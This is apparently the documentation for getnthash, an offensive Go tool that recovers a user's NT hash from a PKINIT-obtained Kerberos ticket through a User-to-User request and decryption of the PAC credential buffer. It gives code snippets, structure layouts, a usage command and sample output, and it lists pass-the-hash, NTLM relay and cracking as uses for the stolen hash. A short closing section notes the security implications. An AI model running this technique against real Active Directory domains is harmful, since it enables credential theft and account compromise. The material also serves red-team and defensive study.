# getnthash - U2U NT Hash Extraction Deep Dive

## Overview

`getnthash` extracts the NT hash from a PKINIT-obtained TGT using User-to-User (U2U) authentication. This is possible because PKINIT TGTs contain an encrypted PAC_CREDENTIAL_INFO buffer with the user's plaintext NT hash.

## Why Does This Work?

When you authenticate via PKINIT:

1. The KDC cannot verify you know the password (you used a certificate)
2. For compatibility, the KDC includes the NT hash in the PAC
3. This allows pass-the-hash and NTLM authentication after PKINIT

The NT hash is encrypted in `PAC_CREDENTIAL_INFO` using a key derived from the PKINIT DH exchange - the **AS-REP key**.

## Protocol Flow

```
┌──────────┐                          ┌──────────┐
│  Client  │                          │   KDC    │
└────┬─────┘                          └────┬─────┘
     │                                     │
     │  TGS-REQ (U2U)                      │
     │  - sname = our own principal        │
     │  - enc-tkt-in-skey flag set         │
     │  - additional-ticket = our TGT      │
     │────────────────────────────────────>│
     │                                     │
     │                                     │ Encrypt service ticket
     │                                     │ with TGT session key
     │                                     │ (not krbtgt key)
     │                                     │
     │  TGS-REP                            │
     │  (ticket encrypted with our key)    │
     │<────────────────────────────────────│
     │                                     │
     │ Decrypt ticket with session key     │
     │ Extract PAC from AuthorizationData  │
     │ Find PAC_CREDENTIAL_INFO            │
     │ Decrypt with AS-REP key             │
     │ Parse NTLM_SUPPLEMENTAL_CREDENTIAL  │
     │                                     │
     ▼                                     ▼
   NT Hash recovered!
```

## Key Implementation Details

### 1. U2U TGS Request

U2U requests a service ticket encrypted with our own TGT session key:

```go
// Use gokrb5's built-in U2U TGS-REQ builder
tgsReq, err := messages.NewUser2UserTGSReq(
    clientPrincipal,
    realm,
    config,
    tgt,           // Our TGT
    sessionKey,    // TGT session key
    clientPrincipal, // Request ticket to ourselves (sname)
    false,         // Not renewal
    tgt,           // Additional ticket — KDC encrypts service ticket
                   // with our session key instead of the krbtgt key
)
```

### 2. PAC Structure

The PAC is nested in Authorization-Data:

```
Ticket
└── EncTicketPart
    └── AuthorizationData
        └── AD-IF-RELEVANT (type 1)
            └── AD-WIN2K-PAC (type 128)
                ├── KERB_VALIDATION_INFO (type 1)
                ├── PAC_CREDENTIAL_INFO (type 2)  ← We want this!
                ├── PAC_SERVER_CHECKSUM (type 6)
                ├── PAC_PRIVSVR_CHECKSUM (type 7)
                └── PAC_CLIENT_INFO (type 10)
```

### 3. PAC_CREDENTIAL_INFO Decryption

```go
// Decrypt with AS-REP key, key usage 16
decrypted, err := crypto.DecryptMessage(
    credInfo.SerializedData,
    asrepKey,     // Key from gettgtpkinit
    16,           // Key usage for PAC credential decryption
)
```

### 4. NDR Parsing

The decrypted data is NDR-encoded:

```go
type PAC_CREDENTIAL_DATA struct {
    CredentialCount uint32
    Credentials     []SECPKG_SUPPLEMENTAL_CRED
}

type NTLM_SUPPLEMENTAL_CREDENTIAL struct {
    Version    uint32     // 0
    Flags      uint32
    LMPassword [16]byte   // Usually zeros
    NTPassword [16]byte   // The NT hash we want!
}
```

## Common Errors

| Error | Cause | Solution |
|-------|-------|----------|
| `PAC_CREDENTIAL_INFO not found` | TGT not from PKINIT | Only PKINIT TGTs contain credentials |
| `failed to decrypt PAC credentials` | Wrong AS-REP key | Use the key from gettgtpkinit output |
| `KDC_ERR_BADOPTION` | U2U not supported | Very old Windows versions |

## Usage Examples

```bash
# Extract NT hash from PKINIT TGT
./getnthash -ccache user.ccache -key <asrep-key> -dc-ip 10.0.0.1
```

## Output

```
Recovered NT Hash: e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6
```

The NT hash can be used for:

- Pass-the-hash attacks
- NTLM relay
- Cracking (if you need the plaintext password)

## Security Implications

This technique demonstrates why:

1. PKINIT alone doesn't eliminate password-based attacks
2. NT hashes are still retrievable even with "passwordless" auth
3. Certificate theft = full credential compromise

## References

- [MS-PAC - PAC Data Structure](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/)
- [UnPAC the Hash](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash) - The Hacker Recipes
- [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
